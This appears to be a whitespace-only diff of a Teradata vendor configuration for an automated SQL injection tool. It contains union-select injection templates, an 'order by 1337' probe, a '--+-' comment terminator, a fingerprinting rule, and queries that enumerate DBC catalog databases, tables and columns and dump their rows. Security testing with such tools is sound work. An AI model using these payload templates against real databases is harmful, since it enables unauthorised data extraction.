@@ -1,58 +1,58 @@
 vendor: Teradata
 
-resource: 
+resource:
  info: |
-  select 
+  select
       '-'
       || '${enclose_value_sql}'
       || database
       || '${enclose_value_sql}'
       || user
       || '${trail_sql}'
-      
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        '${enclose_value_sql}'
        || DatabaseName
        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    FROM (
-       select 
+       select
            DatabaseName,
            ROW_NUMBER() over (ORDER BY DatabaseName) AS rnum
        from DBC.DBASE
    ) x
    where 1 = 1
    ${limit}
-   
+
   table: |
-   select 
+   select
        '${enclose_value_sql}'
        || TVMName
        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    FROM (
-       select 
+       select
            TVMName,
            ROW_NUMBER() over (ORDER BY TVMName) AS rnum
-       from DBC.TVM t 
+       from DBC.TVM t
        inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
        where DatabaseName = '${database}'
    ) x
    where 1 = 1
    ${limit}
-   
+
   column: |
-   select 
+   select
        '${enclose_value_sql}'
        || FieldName
        || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
    FROM (
-       select 
+       select
            FieldName,
            ROW_NUMBER() over (ORDER BY FieldName) AS rnum
        from (
            select distinct FieldName
-           from DBC.TVFIELDS c 
+           from DBC.TVFIELDS c
            inner join DBC.TVM t on c.TableId = t.TVMId
            inner join DBC.DBASE d on t.DatabaseId = d.DatabaseId
            where DatabaseName = '${database}'
@@ -61,27 +61,27 @@ resource:
    )x
    where 1 = 1
    ${limit}
-   
-  row: 
+
+  row:
    query: |
-    SELECT 
+    SELECT
         '${enclose_value_sql}'
         || r
         || '${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
     from (
-        select 
-            ${fields} r, 
+        select
+            ${fields} r,
             ROW_NUMBER() over (ORDER BY 1) AS rnum
         from ${database}.${table}
     )x
     where 1 = 1
     ${limit}
-   fields: 
+   fields:
     field: trim(coalesce(''||${field.value}, ''))
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
    select
        /**
@@ -100,19 +100,19 @@ strategy:
   calibrator: |
    cast(
        rpad(
-           '${calibrator_sql}', 
-           1024, 
+           '${calibrator_sql}',
+           1024,
            '${calibrator_sql}'
        )
        as varchar(1024)
    )
   limitBoundary: 1
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - Teradata database
-    
- normal: 
+
+ normal:
   indices: union select ${indices} FROM (SELECT 1 AS x)x
   capacity: (select '${lead}${indice}' || ${calibrator})
   orderBy: order by 1337
